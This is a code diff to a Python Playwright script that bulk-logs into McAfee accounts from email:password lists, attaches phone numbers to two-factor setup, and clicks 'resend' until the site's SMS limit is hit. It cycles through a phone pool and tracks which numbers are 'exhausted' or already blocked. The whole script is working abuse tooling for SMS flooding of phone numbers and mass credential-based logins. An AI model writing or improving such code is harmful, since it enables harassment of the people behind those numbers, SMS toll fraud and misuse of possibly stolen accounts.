@@ -13,6 +13,8 @@ file_lock = Lock()
 phone_numbers = []
 phone_index = 0
 phone_lock = Lock()
+reuse_phone = None  # Track if we need to reuse a phone number
+reuse_phone_lock = Lock()
 
 
 def clear_console():
@@ -27,13 +29,43 @@ def savecreated(filename, message):
 
 def get_next_phone():
     """Get next phone number from the pool in a thread-safe manner"""
-    global phone_index, phone_numbers, phone_lock
+    global phone_index, phone_numbers, phone_lock, reuse_phone, reuse_phone_lock
+
+    # Check if we need to reuse a phone number
+    with reuse_phone_lock:
+        if reuse_phone is not None:
+            phone = reuse_phone
+            reuse_phone = None  # Clear after use
+            return phone
+
     with phone_lock:
         if phone_index >= len(phone_numbers):
             phone_index = 0  # Reset to beginning if we run out
         phone = phone_numbers[phone_index]
         phone_index += 1
         return phone
+
+
+def set_reuse_phone(phone):
+    """Set a phone number to be reused for the next account"""
+    global reuse_phone, reuse_phone_lock
+    with reuse_phone_lock:
+        reuse_phone = phone
+
+
+def remove_phone_from_file(phone):
+    """Remove a phone number from numbers.txt file"""
+    try:
+        with file_lock:
+            with open("numbers.txt", "r", encoding="utf8") as file:
+                lines = file.readlines()
+            with open("numbers.txt", "w", encoding="utf8") as file:
+                for line in lines:
+                    if line.strip() != phone:
+                        file.write(line)
+            logger.info(f"Removed phone {phone} from numbers.txt (exhausted)")
+    except Exception as e:
+        logger.error(f"Error removing phone from file: {e}")
 
 
 def human_like_click(page, locator):
@@ -109,6 +141,19 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
             except:
                 logger.info(f"{runner_id}: Sign-in button did not reappear, continuing...")
 
+            # Check for login error
+            try:
+                login_error = page.locator('div#login-error-id[data-testid="error-div"]')
+                if login_error.is_visible(timeout=2000):
+                    logger.error(f"{runner_id}: Login failed - Invalid credentials")
+                    savecreated('failed', f"{email}:{password} - Login error: Invalid credentials")
+                    browser.close()
+                    if progress_bar:
+                        progress_bar.update(1)
+                    return
+            except:
+                pass
+
             # Step 4: NOW search for Enable 2FA button (only after second click attempt)
             logger.info(f"{runner_id}: Now searching for Enable 2FA button...")
             enable_2fa_button = page.locator('a#ctl00_MainContent_ctl00_m_EnableTwoFactorButtonLabel')
@@ -149,7 +194,23 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
             logger.info(f"{runner_id}: Clicking continue...")
             continue_button = page.locator('button[name="action"][value="default"][data-action-button-primary="true"]')
             continue_button.click()
-            time.sleep(5)
+            time.sleep(3)
+
+            # Check for IMMEDIATE alert (phone already blocked)
+            try:
+                immediate_alert = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
+                if immediate_alert.is_visible(timeout=2000):
+                    logger.warning(f"{runner_id}: Phone {phone_number} already blocked! Saving to max.txt")
+                    savecreated('max', f"{email}:{password}:{phone_number} - Phone already blocked")
+                    set_reuse_phone(phone_number)  # Reuse this phone for next account
+                    browser.close()
+                    if progress_bar:
+                        progress_bar.update(1)
+                    return
+            except:
+                pass
+
+            time.sleep(2)
 
             # Step 8: Keep clicking resend until max attempts message appears
             logger.info(f"{runner_id}: Working on account, clicking resend until blocked...")
@@ -162,8 +223,13 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
                     # Check for paragraph message
                     max_attempts_msg = page.locator('p:has-text("You\'ve reached the maximum number of resend attempts")')
                     if max_attempts_msg.is_visible(timeout=1000):
-                        logger.success(f"{runner_id}: Account DONE (max resend attempts reached)")
+                        logger.success(f"{runner_id}: Account DONE (max resend attempts reached after {resend_count} resends)")
                         savecreated('completed', f"{email}:{password}:{phone_number}")
+
+                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
+                        if resend_count >= 5:
+                            remove_phone_from_file(phone_number)
+
                         browser.close()
                         if progress_bar:
                             progress_bar.update(1)
@@ -175,8 +241,13 @@ def mcafee_login_automation(email, password, phone_number, runner_id, progress_b
                 try:
                     alert_div = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
                     if alert_div.is_visible(timeout=1000):
-                        logger.success(f"{runner_id}: Account DONE (alert detected - too many SMS)")
+                        logger.success(f"{runner_id}: Account DONE (alert detected after {resend_count} resends)")
                         savecreated('completed', f"{email}:{password}:{phone_number}")
+
+                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
+                        if resend_count >= 5:
+                            remove_phone_from_file(phone_number)
+
                         browser.close()
                         if progress_bar:
                             progress_bar.update(1)
